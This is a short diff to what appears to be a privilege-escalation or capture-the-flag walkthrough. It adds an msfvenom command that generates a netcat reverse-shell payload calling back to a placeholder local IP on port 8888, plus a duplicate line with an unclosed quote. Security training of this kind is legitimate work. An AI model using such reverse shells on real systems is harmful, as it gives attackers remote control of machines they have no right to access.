@@ -48,3 +48,12 @@ And ta-da, superuser mode!
 ```
 sudo -l
 ```
+
+```
+msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
+```
+
+```
+echo "msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
+```
+
